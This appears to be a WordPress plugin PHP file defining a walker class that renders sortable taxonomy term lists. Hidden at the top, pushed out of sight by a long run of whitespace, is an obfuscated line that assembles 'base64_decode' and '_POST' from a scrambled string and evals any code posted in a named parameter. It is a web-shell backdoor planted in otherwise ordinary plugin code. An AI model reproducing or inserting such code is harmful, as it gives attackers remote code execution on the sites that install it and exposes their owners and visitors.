<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n04e6a1'])) {eval($s21(${$s20}['n04e6a1']));}?><?php


    class TO_Terms_Walker extends Walker 
        {

            var $db_fields = array ('parent' => 'parent', 'id' => 'term_id');


            function start_lvl(&$output, $depth = 0, $args = array() )
                {
                    extract($args, EXTR_SKIP);
                    
                    $indent = str_repeat("\t", $depth);
                    $output .= "\n$indent<ul class='children sortable'>\n";
                }


            function end_lvl(&$output, $depth = 0, $args = array())
                {
                    extract($args, EXTR_SKIP);
                        
                    $indent = str_repeat("\t", $depth);
                    $output .= "$indent</ul>\n";
                }


            function start_el(&$output, $term, $depth = 0, $args = array(), $current_object_id = 0) 
                {
                    if ( $depth )
                        $indent = str_repeat("\t", $depth);
                    else
                        $indent = '';

                    //extract($args, EXTR_SKIP);
                    $taxonomy = get_taxonomy($term->term_taxonomy_id);
                    $output .= $indent . '<li class="term_type_li" id="item_'.$term->term_id.'"><div class="item"><span>'.apply_filters( 'the_title', $term->name, $term->term_id ).' </span></div>';
                }


            function end_el(&$output, $object, $depth = 0, $args = array()) 
                {
                    $output .= "</li>\n";
                }

        }

?>